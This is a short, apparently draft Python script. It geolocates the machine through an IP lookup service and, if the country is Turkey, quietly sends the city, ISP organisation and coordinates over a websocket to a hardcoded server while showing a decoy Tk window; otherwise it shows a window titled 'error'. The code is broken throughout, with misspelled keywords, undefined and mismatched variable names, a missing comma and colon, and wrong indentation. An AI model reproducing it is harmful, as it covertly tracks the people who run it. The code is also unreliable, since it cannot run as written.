import requests
import json
import asyncio
import websockets
from tkinter import *

SERVER_WS = "ws://192.168.1.53:8765"


def get_ip_info():
  r = requests.get("https://ipinfo.io/json",timeout=5)
  return r.json()
def is_turk(info):
    return info.get(country) == "TR"


async def send(datainfo):
    asaync with websockets.connect(SERVER_WS) as ws:
         await ws.send(json.dumps(datainfo))


def pro1():
    root = Tk()
    root.geometry('100×100')
    root.title('daya')
    root.mainloop()

def pro2():
    root = Tk()
    root.geometry('200×200')
    root.title('error')
    root.mainloop()

def main():
     info = get_ip_info()

if not is_turk(info):
   pro2()
   return # stop
lat, lot = map(float,info["loc"].split(","))
datainfo = {
    "country":"TR",
  "city":info.get("city")
  "org": info.get("org"),
  "lat":lat,
  "lon":lon
}

asayncio.run(send(datainfo))
pro1()
  
if __name__ =="__main__"
    main()
